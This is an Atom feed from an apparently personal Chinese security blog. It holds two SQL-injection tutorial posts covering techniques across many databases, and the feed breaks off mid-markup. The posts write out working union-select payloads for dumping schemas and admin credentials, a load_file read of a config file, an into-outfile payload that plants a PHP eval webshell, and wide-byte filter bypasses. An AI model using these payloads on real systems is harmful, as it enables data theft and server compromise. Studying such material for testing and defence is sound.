<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-05-23T11:52:01.122Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL注入进阶-各种数据库的注入方式</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/</id>
    <published>2023-05-23T10:24:39.000Z</published>
    <updated>2023-05-23T11:52:01.122Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等</p><p>这些数据库除了Access没有数据库名外，其他都类似，有：<strong>数据库名+表名+列名+数据</strong></p><ul><li>什么决定网站注入点用户权限？<strong>数据库配置文件</strong></li></ul><h2 id="如何识别各个数据库"><a href="#如何识别各个数据库" class="headerlink" title="如何识别各个数据库"></a>如何识别各个数据库</h2><h1 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F/1621405493318-f8a180c6-8b51-4ff6-8ae6-30ab8b9de48a.png" alt="MYSQL注入.png" style="zoom:80%;" /><h2 id="常见手法"><a href="#常见手法" class="headerlink" title="常见手法"></a>常见手法</h2><ol><li><p>找到注入点 <code>and 1=1</code> <code>and 1=2 </code>测试报错</p></li><li><p><code>order by 5 </code># 到5的时候报错，获取字段总数为4</p></li><li><p><code>id=0</code>(不是1就行，强行报错) <code>union select 1,2,3,4</code> # 联合查询，2和3可以显示信息</p></li><li><p>获取数据库信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user() ==&gt;root</span><br><span class="line">database() ==&gt;mozhe_Discuz_StormGroup</span><br><span class="line">version() ==&gt;5.7.22-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure></li><li><p>获取数据库表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">table_name 表名</span><br><span class="line">information_schema.tables 系统生成信息表</span><br><span class="line">table_schema=数据库名16进制或者用单引号括起来</span><br><span class="line"></span><br><span class="line"># 改变limit 0,1中前一个参数，得到其他表</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p></li><li><p>脱库</p></li></ol><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p><strong>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行getshell操作，其中也会遇到很多的阻碍，相关防御手法也要明确，所谓知己知彼，百战不殆。作为安全开发工作者，攻防兼备。</strong></p><p>注入点权限是否为root，取决于连接数据库的文件。这也决定了高权限注入及低权限注入。使用<code>user()</code>进行查看，而且需要注意的是：<em>不是root权限获取不到数据库名。</em></p><h2 id="跨库查询以及应用思路"><a href="#跨库查询以及应用思路" class="headerlink" title="跨库查询以及应用思路"></a>跨库查询以及应用思路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 获取所有数据库名</span><br><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata </span><br><span class="line"></span><br><span class="line"># 查表，找与网站对应的数据库名，若没有，则挨个查。或者使用 union select 1,2,database()</span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line"># 跨库查列</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27;</span><br><span class="line"></span><br><span class="line"># 查结果</span><br><span class="line">?id=-1 union select 1,u,p from qqyw.admin</span><br></pre></td></tr></table></figure><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。</p><p><strong>读取函数</strong>：<code>load_file()</code></p><p><strong>导出函数</strong>：<code>into outfile </code>或<code>into dumpfile</code></p><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ol><li><p>应该设置<code>--secure-file-priv</code></p><p>否则会出现如下错误，这是因为MySQL 限制了数据的导出路径。MySQL 导入导出文件只能在<code>secure-file-priv</code>变量的指定路径下的文件才可以导入导出。如果是NULL那就是禁止输出。而如果是空，则不限制目录。</p><blockquote><p><em>The MySQL server is running with the –secure-file-priv option so it cannot execute this statement。</em></p></blockquote></li><li><p>应该对web<strong>目录需要有写权限</strong>，能够使用单引号</p></li><li><p>应该知道<strong>绝对路径</strong></p><p>读取数据库路径：<code>@@datadir</code></p></li></ol><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><ol><li>只能读取绝对路径的网页文件 读取数据库路径：<code>@@datadir</code></li><li>将绝对路径转换为16进制数时，不需要使用引号</li></ol><p>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,load_file(&#x27;C:\\inetpub\\wwwroot\\mysql-sql\\inc\\set_sql.php&#x27;),3,4</span><br></pre></td></tr></table></figure><p><strong>然后在网页源码中查看</strong></p><h3 id="文件导出（写入到文件）"><a href="#文件导出（写入到文件）" class="headerlink" title="文件导出（写入到文件）"></a>文件导出（写入到文件）</h3><ol><li><p>知道路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select &quot;&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;</span><br></pre></td></tr></table></figure></li><li><p>采用PHPmyadmin，选择一个数据库如test，在数据库中<strong>新创建一个表aa</strong>，在aa中<strong>插入一个数据</strong><code>&lt;?php @eval($_POST[&#39;123&#39;]);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select * from aa into outfile &#x27;C:/phpStudy/WWW/a.php&#x27;; --+</span><br></pre></td></tr></table></figure></li></ol><h3 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h3><ol><li>报错显示：一般网站出现错误的时候它会泄露出路径；</li><li>遗留文件：站长为了调试信息的时候遗留的文件而泄露的路径。用扫描工具可以扫出；</li><li>漏洞报错：知道对方是用什么程序搭建再去网上去搜索漏洞信息：phpcms 爆路径；</li><li>平台配置文件：通过读取文件来读取搭建网站平台的配置文件。缺点：路径不是默认的，一旦更改很难找到路径；</li><li>爆破；</li></ol><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol><li><p>如果是root权限：</p><ol><li><p>写ssh</p></li><li><p>写定时任务反弹shell</p></li><li><p>写日志</p><ol><li>前置条件<ul><li>知道网站的绝对路径</li><li>Web 文件夹宽松权限可以写入</li><li>高权限数据库用户（至少宝塔创建的数据库用户无权set操作）</li><li>支持堆叠注入</li></ul></li></ol><p><strong>MySQL 5.0 版本以上</strong>会创建日志文件，可以通过修改日志的全局变量来 getshell，这个姿势也被用来突破限制</p></li></ol></li><li><p>不确定：</p><ol><li>写webshell</li></ol></li></ol><h2 id="魔术引号及常见保护"><a href="#魔术引号及常见保护" class="headerlink" title="魔术引号及常见保护"></a>魔术引号及常见保护</h2><p>php.ini中存在<strong>magic_quotes_gpc</strong>选项，称为魔术引号，此选项打开，使用<code>GET，POST，cookie</code>所接收的<code>&#39;</code>单引号，<code>&quot;</code>双引号，<code>\</code>反斜线和<code>NULL字符</code>全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。</p><ol><li>编码或宽字节绕过<ol><li>isset无法绕过，则替换关键字</li><li>宽字节绕过<code>0XBF27</code>是两个字符，在PHP中比如<code>addslash</code>和<code>magic_quotes_gpc</code>开启时，由于会对<code>0x27</code>单引号进行转义，因此<code>0xbf27</code>会变成<code>0xbf5c27</code>，而数据进入数据库中时，由于<code>0XBF5C</code>是一个另外的字符，因此<code>\</code>转义符号会被前面的<code>bf</code>带着”<strong>吃掉</strong>“，单引号由此逃逸出来可以用来闭合语句</li></ol></li><li>自定义关键字替换</li></ol><p>其他绕过思路见其他文章</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="低版本注入配合读取或暴力-小于5-0版本"><a href="#低版本注入配合读取或暴力-小于5-0版本" class="headerlink" title="低版本注入配合读取或暴力 小于5.0版本"></a>低版本注入配合读取或暴力 小于5.0版本</h2><p>字典或读取，爆破</p><h1 id="ACCESS"><a href="#ACCESS" class="headerlink" title="ACCESS"></a>ACCESS</h1><p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。</p><p>面对它只能暴力猜解，没有其他办法。</p><ul><li><strong>Access注入时，如果列名或者表名猜解不到的情况怎么办？</strong><ul><li>Access偏移注入：解决列名获取不到的情况。</li></ul></li></ul><ol><li><p>and 1&#x3D;2 报错找到注入点</p></li><li><p>order by 获取总字段</p></li><li><p>猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表</p></li><li><p>猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在</p></li><li><p>脱库 union select 1,username,passwd,4 from admin</p></li></ol><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><ol><li><p>and 1&#x3D;2报错</p></li><li><p>order by N# 获取总字段</p></li><li><p>猜表名 and exists(select * from manage) 表名manage存在</p></li><li><p>猜解列名<code>and exists(select id from manage)</code>列名id存在</p></li><li><p>脱库<code>and exists (select id from manage where id=1 )</code>证明id&#x3D;1存在</p><p>and exists (select id from manage where%20 len(username)&#x3D;8 and id&#x3D;1 ) 猜解username字段长度为8</p><p>and exists (select id from manage where%20 len(password)&#x3D;16 and id&#x3D;1 ) 猜解password字段长度为16</p><p>可用Burp的Intruder功能辅助猜解</p><p>猜解username第1到8位的字符，ASCII转码 admin_mz</p><p>猜解password第1到16位的字符，ASCII转码(Burp 爆破)</p><p>转ASCII的py脚本：</p><p>72e1bfc3f01b7583 MD5解密为97285101</p></li></ol><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><ol><li><code>@@version</code>，查询当前数据库版本 </li><li><code>db_name()</code>，查询当前数据库名称</li><li><code>user,system_user,current_user,user_name</code>，查询当前用户</li><li><code>IS_SRVROLEMEMBER()</code>，查询数据库权限。</li><li><code>@@SERVERNAME</code>：获取有关服务器主机的信息</li></ol><h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><ol><li><p>找注入点 and 1&#x3D;1</p></li><li><p>order by N 猜字段 4</p></li><li><p>猜数据库</p><p>offset &#x3D;&#x3D;&gt;0~2</p><p>有三个数据库：</p><p>WSTMart_reg</p><p>notice_sybase</p><p>sqlite_sequence</p></li><li><p>猜列</p><p>共有3个字段：</p><p>id,name,password</p></li><li><p>脱库</p></li></ol><h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><ol><li><p>id&#x3D;1′ 单引号注入报错</p></li><li><p>闭合语句，查看所有集合</p></li><li><p>查看指定集合的数据</p></li></ol><p>[0] 代表第一条数据，可递增</p><h1 id="DB2"><a href="#DB2" class="headerlink" title="DB2"></a>DB2</h1><ol><li><p>and 1&#x3D;2 判断注入点</p></li><li><p>order by N 获取字段数</p></li><li><p>爆当前数据库：GAME_CHARACTER</p></li><li><p>列表：NAME</p></li><li><p>脱库</p></li></ol><h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><ol><li><p>and 1&#x3D;2 判断注入点</p></li><li><p>order by N 获取字段</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>脱库</p></li></ol><h1 id="Sybase数据库"><a href="#Sybase数据库" class="headerlink" title="Sybase数据库"></a>Sybase数据库</h1><ol><li><p>and 1&#x3D;2 判断注入点</p></li><li><p>order by N 获取总字段</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>查状态：结果为：zhang</p></li><li><p>反选爆用户名：结果为：mozhe</p></li><li><p>猜解密码</p></li></ol><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><ol><li><p>and 1&#x3D;1</p></li><li><p>order by</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>脱库</p></li></ol><p>加上状态：<code>1 where STATUS=1</code></p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h2><h3 id="outfile-和-dumpfile的区别"><a href="#outfile-和-dumpfile的区别" class="headerlink" title="outfile 和 dumpfile的区别"></a>outfile 和 dumpfile的区别</h3><p><strong>outfile:</strong></p><ol><li>支持多行数据同时导出</li><li>使用union联合查询时，要保证两侧查询的列数相同</li><li>会在换行符制表符后面追加反斜杠</li><li>会在末尾追加换行</li></ol><p><strong>dumpfile:</strong></p><ol><li>每次只能导出一行数据</li><li>不会在换行符制表符后面追加反斜杠</li><li>不会在末尾追加换行</li></ol><p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件；<code>into outfile</code>函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 <code>limit</code> 限制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;Access，Mysql，Mssql，mongoDB，postgresql，sqlite，oracle，sybase等&lt;/p&gt;
&lt;p&gt;这些数</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-23T02:29:45.000Z</published>
    <updated>2023-05-23T11:14:10.018Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h1><img src="images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2265061-20210114103534539-1238016327.png" alt="img" style="zoom:80%;" /><h2 id="基础语法以及函数"><a href="#基础语法以及函数" class="headerlink" title="基础语法以及函数"></a>基础语法以及函数</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查询</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"># 更新</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span>’$p’ <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span>‘admin’</span><br><span class="line"># 添加</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(id,url,text) <span class="keyword">values</span>(<span class="number">2</span>,‘x’,’$t’)</span><br><span class="line"># 删除</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> id,name,price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br></pre></td></tr></table></figure><p>其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 增加字段</span><br><span class="line">ALTER TABLE employees ADD phone varchar(20)</span><br><span class="line"># 权限控制(grant revoke)</span><br><span class="line">grant insert on grant_rights to unauthorized_user</span><br><span class="line"># 删表</span><br><span class="line">DROP TABLE users;</span><br></pre></td></tr></table></figure><h3 id="连接词、联合查询"><a href="#连接词、联合查询" class="headerlink" title="连接词、联合查询"></a>连接词、联合查询</h3><p><strong>union：</strong>联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>join</strong>：连接查询（right&#x2F;left join），如下搜索两个表相同的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure><h3 id="注释以及其他符号"><a href="#注释以及其他符号" class="headerlink" title="注释以及其他符号"></a>注释以及其他符号</h3><p><strong>注释：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* */</span>          <span class="keyword">are</span> inline comments</span><br><span class="line"><span class="comment">-- , #          are line comments</span></span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- AND pass = &#x27;pass&#x27;</span></span><br></pre></td></tr></table></figure><p>对于<code>#</code></p><ol><li>url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用</li><li>所以在URL中使用#进行注入时应该将它转成url编码：<code>%23</code></li><li>在POST请求中就不需要（需要验证）</li></ol><p>对于<code>--(空格)</code></p><ol><li>一般在GET请求中，空格会直接被忽略，所以需要把他转化成<code>--%20</code></li><li>还有另外一种方式，就是使用<code>--+</code>，这时候+号会被解释成空格</li><li>为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload</li></ol><p>对于需要编码转码的<code>#</code>有用，因为只有一个字符，POST最好用这个，其他用<code>--+</code></p><p><strong>堆叠查询：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;        allows query chaining</span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure><p><strong>查询可用：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,+,||         allows string concatenation</span></span><br><span class="line"><span class="string">Char()         strings without quotes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example: SELECT * FROM users WHERE name = &#x27;</span><span class="operator">+</span><span class="type">char</span>(<span class="number">27</span>) <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="注入原理以及危害"><a href="#注入原理以及危害" class="headerlink" title="注入原理以及危害"></a>注入原理以及危害</h2><p>对于传入的搜索内容<strong>过滤不严</strong>，导致用户可以通过拼接SQL语句，对数据库进行操作。</p><p>以下情形均可能产生漏洞：</p><ol><li>接收数据</li><li>拼接数据</li><li>数据库执行</li><li>结果展示</li></ol><p>他会导致如下危害：</p><ol><li><p>危害数据库里的<strong>数据</strong></p></li><li><p>直接危害网站的<strong>权限</strong></p></li></ol><p>我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用<strong>猜测</strong>到对方的 <strong>SQL 查询方式</strong></p><h1 id="基本注入"><a href="#基本注入" class="headerlink" title="基本注入"></a>基本注入</h1><p><strong>这里以mysql注入为例子</strong></p><img src="images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20230523110144810.png" alt="image-20230523110144810" style="zoom:80%;" /><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>主要搜集：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统</span><br><span class="line">select @@version_compile_os</span><br><span class="line"># 数据库版本：</span><br><span class="line">select version()</span><br><span class="line">select @@version</span><br><span class="line"># 数据库名字：</span><br><span class="line">select database()</span><br><span class="line"># 数据库用户：</span><br><span class="line">select user()</span><br></pre></td></tr></table></figure><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p>小知识点：</p><blockquote><p>问：一个@与两个@@有何区别？</p><p>答：一个@是用户自定义变量，两个@是系统变量</p></blockquote><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li><p><strong>判断是否能注入，以及注入类型</strong></p><ol><li>先看<strong>是否输出信息</strong>：可以使用<code>&#39;</code>、<code>&quot;</code> 和<code>--+</code>来测试</li><li>输出<strong>正确</strong>、<strong>错误</strong>与<strong>报错</strong>信息：都可以</li><li>输出<strong>正确</strong>、<strong>报错</strong>但不输出错误信息：布尔&#x2F;时间盲注&#x2F;报错注入</li><li>输出<strong>正确</strong>但不输出报错和错误信息：布尔&#x2F;时间盲注</li><li><strong>不输出</strong>任何信息：时间盲注</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 或 且 非 三种逻辑判断符</span><br><span class="line">id=-1&#x27; and 1=1</span><br></pre></td></tr></table></figure></li><li><p><strong>判断有几个注入点：</strong><code>id=1&#39; order by 3--+</code></p></li><li><p><strong>判断输出点有几个是可以回显的</strong>：<code>id=1&#39; union select 1,2,3 --+</code> </p></li><li><p><strong>信息搜集：</strong></p><ol><li>获取数据库:<ol><li>获取此时的数据库：<code>id=-1&#39; union select 1,2,database() --+</code></li><li>获取全部数据库：<code>id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></li></ol></li><li>获取表名:<code>id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code><ol><li>查询其他数据库表名把<code>database()</code>换成<code>&#39;you_want&#39;</code></li></ol></li><li>获取列名：<code>id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;you_want --+&#39;</code></li></ol></li><li><p><strong>数据获取：</strong></p><ol><li>获取单个：<code>id=-1&#39; union select 1,2,[columnname] from [tablename] --+&#39;</code></li><li>获取全部：<ol><li><code>id=-1&#39; union select 1,2,group_concat([allcolumnname]) from [tablename]--+</code></li><li><code>-1&#39; union select 1,2,(select concat_ws([column_name]) from [tbname]) --+</code></li></ol></li></ol></li></ol><h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><p><strong>常用闭合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+ （数字型）</span><br><span class="line">&#x27; or 1=1--+ （字符型）</span><br><span class="line">&quot; or 1=1--+ （字符型）</span><br><span class="line">) or 1=1--+ （MySQL是允许嵌入多个括号的）</span><br><span class="line">&#x27;) or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;)) or 1=1--+</span><br></pre></td></tr></table></figure><p><strong>非注释闭合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|| &#x27;</span><br><span class="line">or &#x27;</span><br><span class="line">&amp;&amp; &#x27;1&#x27;=&#x27;1</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h2 id="报错and盲注"><a href="#报错and盲注" class="headerlink" title="报错and盲注"></a>报错and盲注</h2><p>盲注就是在注入过程中，获取的<strong>数据不能回显</strong>至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p><ol><li>基于布尔的 SQL 盲注-逻辑判断：<code>regexp</code>，<code>like</code>，<code>ascii</code>，<code>left</code>，<code>ord</code>，<code>mid</code></li><li>基于时间的 SQL 盲注-延时判断：<code>if</code>，<code>sleep</code></li><li>基于报错的 SQL 盲注-报错回显：<code>floor</code>，<code>updatexml</code>，<code>extractvalue</code></li></ol><p>对于报错注入，其payload可以安排在如下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or（有效载荷）or&#x27;</span><br><span class="line">&#x27;and（有效载荷）and&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;=&#x27;</span><br><span class="line">&#x27;*（有效载荷）*&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;</span><br><span class="line">“ - （有效载荷） - “</span><br></pre></td></tr></table></figure><p>参考：</p><figure class="highlight plaintext"><table><tr><td 